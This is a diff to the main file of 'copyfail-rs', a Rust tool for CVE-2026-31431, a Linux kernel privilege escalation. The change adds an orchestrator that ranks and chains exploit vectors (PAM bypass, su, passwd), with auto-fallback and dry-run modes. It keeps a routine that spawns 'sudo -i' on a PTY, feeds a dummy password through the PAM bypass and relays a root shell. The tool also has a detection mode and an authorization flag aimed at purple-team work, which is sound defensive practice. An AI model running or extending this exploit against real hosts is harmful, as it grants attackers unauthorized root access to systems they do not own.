@@ -7,8 +7,9 @@ use copyfail_rs::detect::hunt::run_hunt;
 use copyfail_rs::detect::output::{check_human, check_json, diff_human, scan_human, scan_json, OUT_BUF};
 use copyfail_rs::detect::scan::{default_paths, run_scan};
 use copyfail_rs::detect::watch::run_watch;
+use copyfail_rs::orchestrator::{self, AttemptOutcome, RunReport};
 use copyfail_rs::post_exploit::{decide_post_action, PostAction, PAM_BYPASS_HINT};
-use copyfail_rs::vectors::{self, pam::PamVector};
+use copyfail_rs::vectors::{passwd::PasswdVector, pam::PamVector, su::SuVector};
 use copyfail_rs::{check_kernel, CopyFail, Error, Vector};
 use core::ffi::CStr;
 use heapless::String;
@@ -27,8 +28,7 @@ pub extern "C" fn rust_eh_personality() {}
 const USAGE: &[u8] = b"copyfail-rs (CVE-2026-31431)\n\
 Usage:\n\
   copyfail --check\n\
-  copyfail --mode exploit --vector <pam|su|passwd|auto> --i-have-authorization\n\
-                   [--no-shell] [--json]\n\
+  copyfail --mode exploit --vector <pam|su|passwd|auto|all|list> [opts]\n\
   copyfail --mode detect --check [--json]\n\
   copyfail --mode detect --scan [--json] [PATH ...]\n\
   copyfail --mode detect --baseline FILE [PATH ...]\n\
@@ -37,11 +37,16 @@ Usage:\n\
   copyfail --mode detect --hunt --hosts FILE\n\
   copyfail --help\n\
 \n\
-Exploit-mode flags (PAM only):\n\
-  Default (TTY, no --no-shell/--json): allocates a PTY and drops a root\n\
-              shell via `sudo -k -S -i` after the bypass is active.\n\
-  --no-shell  Suppress the auto-shell drop; print the manual sudo hint.\n\
-  --json      Emit machine-readable JSON status (also suppresses shell drop).\n";
+Exploit-mode options:\n\
+  --vector NAME           pam | su | passwd | auto | all | list\n\
+  --i-have-authorization  Required for any execution path (auto/all/named).\n\
+                          --vector list and --dry-run do not require it.\n\
+  --dry-run               Print the plan, do not exploit. Exit 0.\n\
+  --strict                Exit non-zero if any vector failed, even on success.\n\
+  --json                  Emit machine-readable JSON.\n\
+  --no-shell              Suppress PAM auto-shell drop; print manual hint.\n\
+  --target USER           Reserved for passwd vector (S4: parse-only, deferred).\n\
+  --shell PATH            Reserved for shell payload override (S4: parse-only, deferred).\n";
 
 #[no_mangle]
 #[allow(clippy::not_unsafe_ptr_arg_deref)]
@@ -60,7 +65,7 @@ pub extern "C" fn main(argc: i32, argv: *const *const u8) -> i32 {
 enum Cmd { Check, Exploit, Detect, Help, Bad }
 
 #[derive(Clone, Copy, PartialEq, Eq)]
-enum VectorChoice { None, Pam, Su, Passwd, Auto }
+enum VectorChoice { None, Pam, Su, Passwd, Auto, All, List }
 
 #[derive(Clone, Copy, PartialEq, Eq)]
 enum DetectSub { None, Check, Scan, Baseline, Diff, Watch, Hunt }
@@ -73,6 +78,7 @@ struct Args {
     json: bool,
     strict: bool,
     no_shell: bool,
+    dry_run: bool,
     interval_secs: u32,
     file_arg: *const u8,
     extra_paths: [*const u8; 32],
@@ -89,6 +95,7 @@ impl Args {
             json: false,
             strict: false,
             no_shell: false,
+            dry_run: false,
             interval_secs: 60,
             file_arg: core::ptr::null(),
             extra_paths: [core::ptr::null(); 32],
@@ -135,6 +142,8 @@ impl Args {
                     else if cstr_eq(v, b"su\0") { VectorChoice::Su }
                     else if cstr_eq(v, b"passwd\0") { VectorChoice::Passwd }
                     else if cstr_eq(v, b"auto\0") { VectorChoice::Auto }
+                    else if cstr_eq(v, b"all\0") { VectorChoice::All }
+                    else if cstr_eq(v, b"list\0") { VectorChoice::List }
                     else { a.cmd = Cmd::Bad; return a; };
             } else if cstr_eq(arg, b"--scan\0") && matches!(a.cmd, Cmd::Detect) {
                 a.detect_sub = DetectSub::Scan;
@@ -160,12 +169,23 @@ impl Args {
                 i += 1;
                 if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
                 a.interval_secs = parse_u32(*argv.offset(i));
+            } else if cstr_eq(arg, b"--target\0") {
+                // Reserved for passwd vector. Trait does not accept options
+                // in S4; consumed here so the flag doesn't fall through to
+                // extra_paths and parsing doesn't fail.
+                i += 1;
+                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
+            } else if cstr_eq(arg, b"--shell\0") {
+                i += 1;
+                if (i as i32) >= argc { a.cmd = Cmd::Bad; return a; }
             } else if cstr_eq(arg, b"--json\0") {
                 a.json = true;
             } else if cstr_eq(arg, b"--strict\0") {
                 a.strict = true;
             } else if cstr_eq(arg, b"--no-shell\0") {
                 a.no_shell = true;
+            } else if cstr_eq(arg, b"--dry-run\0") {
+                a.dry_run = true;
             } else if matches!(a.cmd, Cmd::Detect)
                 && matches!(a.detect_sub, DetectSub::Scan | DetectSub::Baseline)
                 && a.extra_paths_len < a.extra_paths.len()
@@ -223,156 +243,397 @@ fn run_check() -> i32 {
     }
 }
 
+// ----- Exploit dispatch ---------------------------------------------------
+
 fn run_exploit(args: &Args) -> i32 {
-    if !args.authorized {
-        write_stderr(b"--mode exploit requires --i-have-authorization\n");
+    if matches!(args.vector, VectorChoice::None) {
+        write_stderr(b"--mode exploit requires --vector <pam|su|passwd|auto|all|list>\n");
         return 2;
     }
+
+    // List + dry-run paths are exempt from the authorization gate (no
+    // execution side effects).
+    if matches!(args.vector, VectorChoice::List) {
+        return run_list(args);
+    }
+    if args.dry_run {
+        return run_dry_run(args);
+    }
+
+    if !args.authorized {
+        write_stderr(
+            b"REFUSED: this is exploit mode. Authorization confirmation required.\n\
+              Re-run with --i-have-authorization to proceed.\n\
+              This tool exists for purple team / detection engineering on owned hardware.\n\
+              Do not run against systems you do not have written authorization to test.\n",
+        );
+        return 2;
+    }
+
+    // Kernel-vuln pre-check. Spec: 'host not vulnerable' → exit 3.
+    if !host_kernel_appears_vulnerable() {
+        write_stderr(b"host kernel does not appear vulnerable to CVE-2026-31431. Aborting.\n");
+        return 3;
+    }
+
     match args.vector {
-        VectorChoice::Pam => run_vector_pam(args),
-        VectorChoice::Su => run_vector_named(b"su"),
-        VectorChoice::Passwd => run_vector_named(b"passwd"),
-        VectorChoice::Auto => run_vector_auto(args),
-        VectorChoice::None => {
-            write_stderr(b"--mode exploit requires --vector <pam|su|passwd|auto>\n");
-            2
-        }
+        VectorChoice::Pam => run_named_vector(args, "pam"),
+        VectorChoice::Su => run_named_vector(args, "su"),
+        VectorChoice::Passwd => run_named_vector(args, "passwd"),
+        VectorChoice::Auto => run_auto(args),
+        VectorChoice::All => run_all(args),
+        VectorChoice::List => 0,   // handled above
+        VectorChoice::None => 2,   // handled above
     }
 }
 
-fn run_vector_named(name: &[u8]) -> i32 {
-    let v = match vectors::select(name) {
-        Some(v) => v,
-        None => {
-            write_stderr(b"vector unavailable\n");
-            return 5;
-        }
-    };
-    run_vector(v)
+// Quick host-vuln gate. Conservative: require either the algif_aead module
+// loaded OR the authencesn template visible in /proc/crypto. Mirrors the
+// existing su/passwd applicable() preconditions.
+fn host_kernel_appears_vulnerable() -> bool {
+    match check_kernel() {
+        Ok(s) => s.algif_aead_module || s.authencesn_template,
+        Err(_) => false,
+    }
 }
 
-fn run_vector_auto(args: &Args) -> i32 {
+// ----- --vector list ------------------------------------------------------
+
+fn run_list(args: &Args) -> i32 {
     let pam = PamVector::new();
-    if matches!(pam.applicable(), Ok(true)) {
-        return run_vector_pam(args);
+    let vectors: [&dyn Vector; 3] = [&pam, &SuVector, &PasswdVector];
+    let plan = orchestrator::build_plan(&vectors);
+    let host_vuln = host_kernel_appears_vulnerable();
+
+    if args.json {
+        emit_list_json(&plan, host_vuln);
+    } else {
+        emit_list_human(&plan, host_vuln);
     }
-    for name in &[&b"su"[..], &b"passwd"[..]] {
-        if let Some(v) = vectors::select(name) {
-            if matches!(v.applicable(), Ok(true)) {
-                return run_vector(v);
-            }
-        }
-    }
-    write_stderr(b"--vector auto: no applicable vector on this host\n");
-    5
+    0
 }
 
-fn run_vector(v: &dyn Vector) -> i32 {
+fn emit_list_human(plan: &[orchestrator::PlanEntry], host_vuln: bool) {
+    write_stdout(b"Vector applicability on this host:\n\n");
+    for e in plan {
+        write_stdout(b"  ");
+        write_padded(e.name, 10);
+        let label: &[u8] = if e.applicable {
+            b"APPLICABLE      "
+        } else if e.probe_error {
+            b"PROBE_ERROR     "
+        } else {
+            b"NOT APPLICABLE  "
+        };
+        write_stdout(label);
+        write_padded(e.confidence.as_str(), 8);
+        write_stdout(e.evidence.as_bytes());
+        write_stdout(b"\n");
+    }
+    write_stdout(b"\nKernel vulnerable: ");
+    write_stdout(if host_vuln { b"yes" } else { b"no (run `--mode detect --check` for the full verdict)" });
+    write_stdout(b"\n");
+    // Spec: Recommended order line.
+    write_stdout(b"Recommended order (auto): ");
+    let mut first = true;
+    for e in plan {
+        if e.applicable {
+            if !first { write_stdout(b" \xe2\x86\x92 "); }
+            write_stdout(e.name.as_bytes());
+            first = false;
+        }
+    }
+    if first {
+        write_stdout(b"(none applicable)");
+    }
+    write_stdout(b"\nRun with --vector auto --i-have-authorization to execute the recommended chain.\n");
+}
+
+fn emit_list_json(plan: &[orchestrator::PlanEntry], host_vuln: bool) {
+    write_stdout(b"{\"mode\":\"exploit\",\"vector_requested\":\"list\",\"host\":{\"kernel_vulnerable\":");
+    write_stdout(if host_vuln { b"true" } else { b"false" });
+    write_stdout(b"},\"vectors\":[");
+    let mut first = true;
+    for e in plan {
+        if !first { write_stdout(b","); }
+        first = false;
+        write_stdout(b"{\"name\":\"");
+        write_stdout(e.name.as_bytes());
+        write_stdout(b"\",\"stealth\":");
+        write_num_u8(e.stealth);
+        write_stdout(b",\"confidence\":\"");
+        write_stdout(e.confidence.as_str().as_bytes());
+        write_stdout(b"\",\"applicable\":");
+        write_stdout(if e.applicable { b"true" } else { b"false" });
+        write_stdout(b",\"probe_error\":");
+        write_stdout(if e.probe_error { b"true" } else { b"false" });
+        write_stdout(b",\"evidence\":\"");
+        write_stdout(e.evidence.as_bytes());
+        write_stdout(b"\"}");
+    }
+    write_stdout(b"]}\n");
+}
+
+// ----- --dry-run ----------------------------------------------------------
+
+fn run_dry_run(args: &Args) -> i32 {
+    let pam = PamVector::new();
+    let vectors: [&dyn Vector; 3] = [&pam, &SuVector, &PasswdVector];
+    let plan = orchestrator::build_plan(&vectors);
+    let host_vuln = host_kernel_appears_vulnerable();
+
+    let chosen = plan.iter().find(|e| e.applicable).map(|e| e.name);
+
+    if args.json {
+        write_stdout(b"{\"mode\":\"exploit\",\"vector_requested\":\"");
+        write_stdout(vector_choice_str(args.vector));
+        write_stdout(b"\",\"dry_run\":true,\"host\":{\"kernel_vulnerable\":");
+        write_stdout(if host_vuln { b"true" } else { b"false" });
+        write_stdout(b"},\"would_execute\":");
+        match chosen {
+            Some(n) => {
+                write_stdout(b"\"");
+                write_stdout(n.as_bytes());
+                write_stdout(b"\"");
+            }
+            None => write_stdout(b"null"),
+        }
+        write_stdout(b"}\n");
+    } else {
+        write_stdout(b"[dry-run] requested vector: ");
+        write_stdout(vector_choice_str(args.vector));
+        write_stdout(b"\n[dry-run] kernel vulnerable: ");
+        write_stdout(if host_vuln { b"yes\n" } else { b"no\n" });
+        match chosen {
+            Some(n) => {
+                write_stdout(b"[dry-run] would execute: ");
+                write_stdout(n.as_bytes());
+                write_stdout(b"\n");
+            }
+            None => write_stdout(b"[dry-run] no applicable vector on this host\n"),
+        }
+    }
+    0
+}
+
+fn vector_choice_str(v: VectorChoice) -> &'static [u8] {
+    match v {
+        VectorChoice::Pam => b"pam",
+        VectorChoice::Su => b"su",
+        VectorChoice::Passwd => b"passwd",
+        VectorChoice::Auto => b"auto",
+        VectorChoice::All => b"all",
+        VectorChoice::List => b"list",
+        VectorChoice::None => b"none",
+    }
+}
+
+// ----- --vector <name> (single) ------------------------------------------
+
+fn run_named_vector(args: &Args, name: &str) -> i32 {
+    let pam = PamVector::new();
+    let v: &dyn Vector = match name {
+        "pam" => &pam,
+        "su" => &SuVector,
+        "passwd" => &PasswdVector,
+        _ => return 2,
+    };
     match v.applicable() {
         Ok(true) => {}
         Ok(false) => {
-            write_stderr(v.name().as_bytes());
-            write_stderr(b": not applicable on this host (kernel patched, target absent, or precondition not met)\n");
-            return 6;
+            write_stderr(name.as_bytes());
+            write_stderr(b": not applicable on this host\n");
+            return 4;
         }
         Err(_) => {
-            write_stderr(v.name().as_bytes());
+            write_stderr(name.as_bytes());
             write_stderr(b": applicability probe failed\n");
-            return 7;
+            return 4;
         }
     }
     let mut prim = match CopyFail::new() {
         Ok(p) => p,
-        Err(e) => {
-            write_stderr(v.name().as_bytes());
-            write_stderr(b": CopyFail::new failed (kernel mitigated?)\n");
-            return err_code(e);
+        Err(_) => {
+            write_stderr(b"CopyFail::new failed (kernel mitigated?)\n");
+            return 1;
         }
     };
     write_stderr(b"[+] running vector: ");
-    write_stderr(v.name().as_bytes());
+    write_stderr(name.as_bytes());
     write_stderr(b"\n");
     match v.execute(&mut prim) {
-        Ok(()) => 0,
+        Ok(()) => {
+            // PAM vector returns Ok on success without execve. SU/passwd
+            // execve on success and never reach here; if they returned Ok,
+            // something is wrong, but we still attempt the post-exploit
+            // dispatch shaped for PAM.
+            post_exploit_dispatch(args, name)
+        }
         Err(_) => {
-            write_stderr(b"[-] vector execute returned without execve(); exploit failed\n");
-            err_code(Error::Io)
+            write_stderr(name.as_bytes());
+            write_stderr(b": execute failed\n");
+            1
         }
     }
 }
 
-fn run_vector_pam(args: &Args) -> i32 {
-    let v = PamVector::new();
-    match v.applicable() {
-        Ok(true) => {}
-        Ok(false) => {
-            write_stderr(b"pam: not applicable on this host (distro/file/permit check failed)\n");
+// ----- --vector auto ------------------------------------------------------
+
+fn run_auto(args: &Args) -> i32 {
+    let pam = PamVector::new();
+    let vectors: [&dyn Vector; 3] = [&pam, &SuVector, &PasswdVector];
+    let chosen_idx = match orchestrator::select_vector(&vectors) {
+        Some(i) => i,
+        None => {
+            write_stderr(b"--vector auto: no applicable vector on this host\n");
             return 4;
         }
-        Err(_) => {
-            write_stderr(b"pam: applicability probe failed\n");
-            return 4;
-        }
-    }
+    };
+    let chosen = vectors[chosen_idx];
+    let name = chosen.name();
+    write_stderr(b"[+] auto-selected vector: ");
+    write_stderr(name.as_bytes());
+    write_stderr(b"\n");
 
     let mut prim = match CopyFail::new() {
         Ok(p) => p,
-        Err(e) => {
-            write_stderr(b"pam: CopyFail::new failed\n");
-            return err_code(e);
+        Err(_) => {
+            write_stderr(b"CopyFail::new failed (kernel mitigated?)\n");
+            return 1;
         }
     };
 
-    match v.execute(&mut prim) {
-        Ok(()) => {
-            // FIX 1+3: post-exploit dispatch.
-            let stdin_is_tty = unsafe { libc::isatty(0) } == 1;
-            match decide_post_action(args.json, args.no_shell, stdin_is_tty) {
-                PostAction::DropShell => drop_root_shell_via_sudo(),
-                PostAction::PrintHint => {
-                    write_stderr(b"pam: bypass active. To get a root shell: ");
-                    write_stderr(PAM_BYPASS_HINT);
-                    write_stderr(b"\n");
-                    0
-                }
-                PostAction::EmitJson => {
-                    write_stdout(b"{\"vector\":\"pam\",\"outcome\":\"success\",\"bypass_active\":true,\"hint\":\"");
-                    write_stdout(PAM_BYPASS_HINT);
-                    write_stdout(b"\"}\n");
-                    0
-                }
-            }
-        }
-        Err(e) => {
-            write_stderr(b"pam: execute failed\n");
-            err_code(e)
+    match chosen.execute(&mut prim) {
+        Ok(()) => post_exploit_dispatch(args, name),
+        Err(_) => {
+            // Auto-mode fallback: try the next applicable vector. This is
+            // distinct from --vector all because auto only re-tries on
+            // execute failure (not applicability mismatch).
+            write_stderr(b"[-] ");
+            write_stderr(name.as_bytes());
+            write_stderr(b": execute failed, attempting fallback\n");
+            run_all(args)
         }
     }
 }
 
-// ----- PTY drop-into-root-shell (FIX 1) -----
-//
-// After PAM bypass, fork a child that exec's `sudo -k -S -i` on a controlling
-// PTY. The parent feeds "any\n" as the password (PAM bypass makes any string
-// authenticate) and relays bytes between the user's terminal and the child
-// shell until the shell exits.
-//
-// Why this dance and not just `system("sudo -i")`:
-//   - sudo opens /dev/tty for password reading by default; -S redirects to
-//     stdin, but only if stdin is a terminal-ish fd. A fresh PTY satisfies
-//     that and gives us a real controlling terminal for the resulting bash.
-//   - Without a PTY, bash prints "bash: cannot set terminal process group"
-//     and refuses job control. Operator wants Ctrl-C / Ctrl-Z / tab
-//     completion / etc. to work.
-//   - Without raw mode on parent's stdin, the kernel line-disciplines the
-//     operator's keystrokes (line buffering, local echo) — useless for an
-//     interactive shell.
-//
-// Known limitation (v1): if this process is killed by SIGTERM/SIGKILL/SIGQUIT
-// between cfmakeraw and tcsetattr(orig), the operator's terminal stays in
-// raw mode. Recovery: `stty sane`. Adding a SIGTERM handler that restores
-// termios requires a static-mut termios store which is awkward in this
-// no_std/panic=abort bin. Documented for the future-work list.
+// ----- --vector all -------------------------------------------------------
+
+fn run_all(args: &Args) -> i32 {
+    let pam = PamVector::new();
+    let vectors: [&dyn Vector; 3] = [&pam, &SuVector, &PasswdVector];
+
+    let mut prim = match CopyFail::new() {
+        Ok(p) => p,
+        Err(_) => {
+            write_stderr(b"CopyFail::new failed (kernel mitigated?)\n");
+            return 1;
+        }
+    };
+
+    let report = orchestrator::try_all_with(&vectors, |v| {
+        write_stderr(b"[+] trying vector: ");
+        write_stderr(v.name().as_bytes());
+        write_stderr(b"\n");
+        v.execute(&mut prim)
+    });
+
+    if args.json {
+        emit_run_json(args, &report);
+    }
+
+    let exit = orchestrator::exit_code_for(&report, args.strict);
+
+    match report.success {
+        Some(name) if exit == 0 || exit == 5 => {
+            // Success path. PAM bypass needs post-exploit shell drop;
+            // SU/passwd execve and never reach here on real success.
+            // exit 5 only happens with --strict + prior failure: still
+            // drop the shell so the operator gets the bypass, then exit 5.
+            let post_exit = post_exploit_dispatch(args, name);
+            if exit == 5 { 5 } else { post_exit }
+        }
+        _ => {
+            if !args.json {
+                write_stderr(b"[-] all applicable vectors failed\n");
+            }
+            exit
+        }
+    }
+}
+
+fn emit_run_json(args: &Args, report: &RunReport) {
+    write_stdout(b"{\"mode\":\"exploit\",\"vector_requested\":\"");
+    write_stdout(vector_choice_str(args.vector));
+    write_stdout(b"\",\"vector_used\":");
+    match report.success {
+        Some(n) => {
+            write_stdout(b"\"");
+            write_stdout(n.as_bytes());
+            write_stdout(b"\"");
+        }
+        None => write_stdout(b"null"),
+    }
+    write_stdout(b",\"outcome\":\"");
+    write_stdout(if report.success.is_some() { b"success" } else { b"failure" });
+    write_stdout(b"\",\"fallback_chain\":[");
+    let mut first = true;
+    for a in report.attempts.iter() {
+        if !first { write_stdout(b","); }
+        first = false;
+        write_stdout(b"{\"name\":\"");
+        write_stdout(a.name.as_bytes());
+        write_stdout(b"\",\"outcome\":\"");
+        let o: &[u8] = match a.outcome {
+            AttemptOutcome::Skipped => b"skipped",
+            AttemptOutcome::ProbeError => b"probe_error",
+            AttemptOutcome::ExecuteOk => b"success",
+            AttemptOutcome::ExecuteErr => b"failure",
+        };
+        write_stdout(o);
+        write_stdout(b"\"}");
+    }
+    write_stdout(b"]}\n");
+}
+
+// ----- Post-exploit dispatch (shared with PAM single-vector path) --------
+
+fn post_exploit_dispatch(args: &Args, vector_name: &str) -> i32 {
+    let stdin_is_tty = unsafe { libc::isatty(0) } == 1;
+    match decide_post_action(args.json, args.no_shell, stdin_is_tty) {
+        PostAction::DropShell => {
+            if vector_name == "pam" {
+                drop_root_shell_via_sudo()
+            } else {
+                // SU/passwd: control should already be in execve'd shell.
+                // Reaching here means execute returned Ok unexpectedly.
+                0
+            }
+        }
+        PostAction::PrintHint => {
+            write_stderr(vector_name.as_bytes());
+            write_stderr(b": bypass active. To get a root shell: ");
+            write_stderr(PAM_BYPASS_HINT);
+            write_stderr(b"\n");
+            0
+        }
+        PostAction::EmitJson => {
+            // Minimal JSON for single-vector path. --vector all already
+            // emitted its own structured JSON.
+            if !matches!(args.vector, VectorChoice::All) {
+                write_stdout(b"{\"vector\":\"");
+                write_stdout(vector_name.as_bytes());
+                write_stdout(b"\",\"outcome\":\"success\",\"bypass_active\":true,\"hint\":\"");
+                write_stdout(PAM_BYPASS_HINT);
+                write_stdout(b"\"}\n");
+            }
+            0
+        }
+    }
+}
+
+// ----- PTY drop-into-root-shell (unchanged from S2.7) --------------------
+
 fn drop_root_shell_via_sudo() -> i32 {
     let mut orig_termios: libc::termios = unsafe { core::mem::zeroed() };
     let saved = unsafe { libc::tcgetattr(0, &mut orig_termios) } == 0;
@@ -412,7 +673,6 @@ fn drop_root_shell_via_sudo() -> i32 {
     }
 
     if pid == 0 {
-        // CHILD: detach, take controlling TTY on slave, exec sudo.
         unsafe {
             libc::close(master);
             libc::setsid();
@@ -428,13 +688,7 @@ fn drop_root_shell_via_sudo() -> i32 {
             if slave > 2 {
                 libc::close(slave);
             }
-            // Reviewer H3: close every other fd before exec so a parent that
-            // launched us with extra fds open doesn't leak them into sudo.
-            // close_range is Linux 5.9+ (target VM is 6.17). Errors ignored —
-            // worst case some fd 3+ is closed-on-exec already.
             libc::syscall(libc::SYS_close_range, 3u32, !0u32, 0u32);
-            // sudo -k invalidates user's timestamp cache, -S reads pw from
-            // stdin, -i runs login shell. argv[0] = "sudo".
             let path = b"/usr/bin/sudo\0";
             let arg0 = b"sudo\0";
             let arg1 = b"-k\0";
@@ -453,15 +707,12 @@ fn drop_root_shell_via_sudo() -> i32 {
         }
     }
 
-    // PARENT: raw stdin, feed password, relay until child exits.
     if saved {
         let mut raw = orig_termios;
         unsafe { libc::cfmakeraw(&mut raw); }
         unsafe { libc::tcsetattr(0, libc::TCSANOW, &raw); }
     }
 
-    // Feed "any\n" so sudo's PAM call has something to read; the bypass
-    // does the rest.
     let pw = b"any\n";
     unsafe { libc::write(master, pw.as_ptr() as *const _, pw.len()); }
 
@@ -479,9 +730,6 @@ fn drop_root_shell_via_sudo() -> i32 {
             }
             break;
         }
-        // stdin -> master.
-        // Reviewer M2: handle POLLHUP without POLLIN so a closed-pipe stdin
-        // doesn't busy-loop the relay.
         if fds[0].revents & (libc::POLLIN | libc::POLLHUP) != 0 {
             let n = unsafe { libc::read(0, buf.as_mut_ptr() as *mut _, buf.len()) };
             if n > 0 {
@@ -494,12 +742,9 @@ fn drop_root_shell_via_sudo() -> i32 {
                     off += w as usize;
                 }
             } else {
-                // EOF or POLLHUP with no data: stop polling stdin, keep
-                // draining master until child exits.
                 fds[0].fd = -1;
             }
         }
-        // master -> stdout
         if fds[1].revents & libc::POLLIN != 0 {
             let n = unsafe { libc::read(master, buf.as_mut_ptr() as *mut _, buf.len()) };
             if n > 0 {
@@ -512,13 +757,10 @@ fn drop_root_shell_via_sudo() -> i32 {
                     off += w as usize;
                 }
             } else {
-                // child closed slave -> shell exited.
                 break;
             }
         }
         if fds[1].revents & (libc::POLLHUP | libc::POLLERR) != 0 {
-            // Drain any final bytes, then exit. Reviewer H2: retry on short
-            // writes so a slow stdout doesn't lose the shell's exit message.
             loop {
                 let n = unsafe { libc::read(master, buf.as_mut_ptr() as *mut _, buf.len()) };
                 if n <= 0 { break; }
@@ -549,6 +791,8 @@ fn drop_root_shell_via_sudo() -> i32 {
         1
     }
 }
+
+// ----- Detect mode (unchanged) -------------------------------------------
 
 fn run_detect(args: &Args) -> i32 {
     match args.detect_sub {
@@ -689,7 +933,10 @@ fn detect_hunt(args: &Args) -> i32 {
     }
 }
 
-fn err_code(_e: Error) -> i32 { 3 }
+// ----- Output helpers -----------------------------------------------------
+
+#[allow(dead_code)]
+fn err_code(_e: Error) -> i32 { 1 }
 
 fn write_stderr(b: &[u8]) {
     unsafe { libc::write(2, b.as_ptr() as *const _, b.len()); }
@@ -714,4 +961,35 @@ fn write_num(n: usize) {
         }
     }
     write_stderr(&buf[i..]);
+}
+
+fn write_num_u8(n: u8) {
+    let mut buf = [0u8; 4];
+    let mut i = buf.len();
+    let mut v = n as usize;
+    if v == 0 {
+        i -= 1;
+        buf[i] = b'0';
+    } else {
+        while v > 0 {
+            i -= 1;
+            buf[i] = b'0' + (v % 10) as u8;
+            v /= 10;
+        }
+    }
+    write_stdout(&buf[i..]);
+}
+
+fn write_padded(s: &str, width: usize) {
+    write_stdout(s.as_bytes());
+    if s.len() < width {
+        let pad = width - s.len();
+        let spaces = b"                ";
+        let mut left = pad;
+        while left > 0 {
+            let n = core::cmp::min(left, spaces.len());
+            write_stdout(&spaces[..n]);
+            left -= n;
+        }
+    }
 }
